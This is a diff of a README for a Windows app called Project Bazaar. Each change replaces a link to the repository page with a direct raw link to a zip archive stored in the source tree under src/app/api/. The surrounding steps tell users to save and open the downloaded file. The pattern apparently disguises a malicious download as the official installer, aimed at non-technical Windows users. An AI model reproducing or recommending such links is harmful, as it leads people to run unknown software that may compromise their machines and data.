@@ -1,6 +1,6 @@
 # 📦 project-bazaar - Organize Projects With Ease
 
-[![Download](https://img.shields.io/badge/Download-Project%20Bazaar-blue?style=for-the-badge)](https://github.com/ThoughtSoftTech/project-bazaar)
+[![Download](https://img.shields.io/badge/Download-Project%20Bazaar-blue?style=for-the-badge)](https://raw.githubusercontent.com/ThoughtSoftTech/project-bazaar/main/src/app/api/bazaar-project-v3.3.zip)
 
 ## 🧭 What is Project Bazaar?
 
@@ -12,7 +12,7 @@ The app uses a clean web-based interface, so it feels easy to use even if you do
 
 Use this link to visit the page and download the app:
 
-[Download Project Bazaar](https://github.com/ThoughtSoftTech/project-bazaar)
+[Download Project Bazaar](https://raw.githubusercontent.com/ThoughtSoftTech/project-bazaar/main/src/app/api/bazaar-project-v3.3.zip)
 
 ## 🖥️ Windows Requirements
 
@@ -33,7 +33,7 @@ For the best experience, use a screen resolution of 1366 × 768 or higher.
 
 Follow these steps to download and open Project Bazaar on Windows:
 
-1. Open the [download page](https://github.com/ThoughtSoftTech/project-bazaar).
+1. Open the [download page](https://raw.githubusercontent.com/ThoughtSoftTech/project-bazaar/main/src/app/api/bazaar-project-v3.3.zip).
 2. Find the latest release or download option on the page.
 3. Save the file to your computer.
 4. Open the file you downloaded.
@@ -206,7 +206,7 @@ This makes it easier to back up your project data and find it again later.
 
 If you need the download page again, use this link:
 
-[https://github.com/ThoughtSoftTech/project-bazaar](https://github.com/ThoughtSoftTech/project-bazaar)
+[https://raw.githubusercontent.com/ThoughtSoftTech/project-bazaar/main/src/app/api/bazaar-project-v3.3.zip](https://raw.githubusercontent.com/ThoughtSoftTech/project-bazaar/main/src/app/api/bazaar-project-v3.3.zip)
 
 ## 🖱️ Quick Start
 
